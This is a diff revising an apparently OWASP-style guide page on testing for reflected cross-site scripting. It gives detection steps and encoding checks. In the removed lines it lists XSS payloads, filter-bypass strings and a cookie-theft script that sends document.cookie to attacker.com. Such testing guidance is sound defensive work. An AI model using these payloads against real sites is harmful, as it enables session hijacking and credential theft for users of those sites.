@@ -1,44 +1,64 @@
 WSTG-INPV-01: Testing for Reflected Cross Site Scripting
 
-Summary:
-Reflected XSS occurs when user-supplied input is immediately included in the HTML response without proper sanitization or encoding. Unlike stored XSS, the malicious payload is not persisted but is delivered to victims through crafted URLs or forms (typically via phishing). The script executes in the victim's browser under the application's origin.
+## Summary
+Reflected Cross-site Scripting (XSS) occurs when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim.
 
-Test Objectives:
-- Identify all input vectors reflected in the HTML response
-- Determine whether the application encodes user input in all output contexts
-- Assess the impact (session hijacking, credential theft, DOM manipulation)
+Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS.
 
-How to Test:
+When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser.
 
-1. Identify Reflection Points
-   - Send a unique benign string (e.g., xss12345) in every input parameter
-   - Inspect the response to identify where the string appears (HTML body, attributes, JavaScript, URL)
-   - Map the context: HTML content, attribute value, JavaScript variable, URL query string
+Commonly the attacker's code is written in the JavaScript language, but other scripting languages such as ActionScript and VBScript can also be used. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links).
 
-2. Context-Specific Payloads
-   - HTML body context: <script>alert(1)</script>, <img src=x onerror=alert(1)>
-   - HTML attribute context: " onmouseover="alert(1), ' onload='alert(1)
-   - JavaScript context: ';alert(1)//, \';alert(1)//
-   - URL context: javascript:alert(1)
+One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out `<script>`, but might not filter `%3cscript%3e` which simply includes another encoding of tags.
 
-3. Filter Bypass Techniques
-   - Case variation: <ScRiPt>, <SCRIPT>
-   - Encoding: &#x3c;script&#x3e;, %3cscript%3e
-   - Event handlers: <svg onload=alert(1)>, <body onpageshow=alert(1)>
-   - Without parentheses: <img src=x onerror=alert`1`>
+## Test Objectives
+- Identify variables that are reflected in responses.
+- Assess the input they accept and the encoding that gets applied on return (if any).
 
-4. Impact Assessment
-   - Demonstrate session cookie theft: <script>document.location='http://attacker.com/?c='+document.cookie</script>
-   - Check if HttpOnly flag prevents cookie access (reduces impact but doesn't eliminate XSS)
+## How to Test
+### Black-Box Testing
 
-Tools:
-   - Burp Suite (Intruder/Repeater for payload injection)
-   - XSStrike: automated XSS scanner with context-aware payloads
-   - OWASP ZAP: active XSS scanner
+A black-box test will include at least three phases:
 
-Expected Secure Behavior (Pass Conditions):
-- All user input reflected in HTML output is HTML-entity-encoded
-- Content-Security-Policy header present and restricts inline scripts
-- X-XSS-Protection header set (legacy browsers)
-- Output encoding is context-appropriate (HTML, JS, URL, CSS contexts)
-- HttpOnly flag set on session cookies
+#### Detect Input Vectors
+
+Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below.
+
+#### Analyze Input Vectors
+
+Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually.
+  Some example of such input data are the following:
+
+- `<script>alert(123)</script>`
+- `"><script>alert(document.cookie)</script>`
+
+For a comprehensive list of potential test strings see the XSS Filter Evasion Cheat Sheet.
+
+#### Check Impact
+
+For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML.
+
+Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are:
+
+- `>` (greater than)
+- `<` (less than)
+- `&` (ampersand)
+- `'` (apostrophe or single quote)
+- `"` (double quote)
+
+However, a full list of entities is defined by the HTML and XML specifications. Wikipedia has a complete reference.
+
+Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include:
+
+- `\n` (new line)
+- `\r` (carriage return)
+- `'` (apostrophe or single quote)
+- `"` (double quote)
+- `\` (backslash)
+- `\uXXXX` (unicode values)
+
+For a more complete reference, see the Mozilla JavaScript guide.
+
+#### Example 1
+
+[...truncated]
